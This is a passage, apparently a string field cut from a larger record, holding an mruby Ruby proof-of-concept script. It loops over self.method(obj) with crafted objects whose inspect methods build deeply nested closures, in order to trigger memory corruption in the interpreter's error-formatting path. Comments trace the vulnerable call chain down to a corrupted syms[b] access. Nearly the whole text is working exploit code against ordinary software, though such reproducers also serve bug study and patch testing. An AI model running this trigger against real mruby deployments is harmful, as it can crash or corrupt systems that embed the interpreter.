es\n# The call chain: method(obj) -> mrb_kernel_method -> mrb_get_args("n") \n# -> mrb_obj_to_sym -> mrb_raisef -> mrb_inspect -> nested mrb_vm_exec\n# -> cipop -> mrb_env_unshare (allocations) -> corrupted syms[b] access\n200.times do |attempt|\n  begin\n    obj = ExploitObject.new(attempt)\n    \n    # This triggers the vulnerability path\n    # method() expects a symbol, passing object triggers error formatting\n    # which calls inspect() in a nested VM execution context\n    self.method(obj)\n  rescue TypeError\n    # Expected error, continue to next attempt\n  rescue => e\n    # Any other error, continue\n  end\n  \n  # Periodically create more memory pressure\n  if attempt % 10 == 0\n    temp = []\n    100.times do |j|\n      temp << ExploitObject.new(j + 1000)\n      # Trigger nested calls on temp objects too\n      begin\n        self.method(temp[-1])\n      rescue\n      end\n    end\n  end\nend\n\n# Final deep trigger with extreme nesting\nclass DeepExploit\n  def inspect\n    # Recursive nested closures\n    recurse = lambda { |n|\n      if n > 0\n        a = lambda { |x|\n          b = proc { |y|\n            c = proc { |z|\n              x + y + z + n\n            }\n            c.call(3)\n          }\n          b.call(2)\n        }\n        a.call(1)\n        recurse.call(n - 1)\n      end\n      "deep"\n    }\n    recurse.call(100)\n    "DeepExploit"\n  end\nend\n\n# Final attempts\n50.times do\n  begin\n    self.method(DeepExploit.new)\n  rescue\n  end\nend\n'}
